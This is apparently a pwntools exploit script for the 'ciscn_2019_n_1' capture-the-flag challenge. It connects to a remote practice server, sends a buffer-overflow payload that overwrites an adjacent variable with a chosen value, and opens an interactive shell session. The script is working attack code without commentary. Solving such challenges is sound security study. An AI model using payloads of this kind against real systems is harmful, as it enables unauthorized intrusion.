from pwn import *

#sh = process("./ciscn_2019_n_1")
sh = remote("node3.buuoj.cn", 27948)

payload = cyclic(0x30 - 0x4) + p64(0x41348000)
sh.sendline(payload)

sh.interactive()

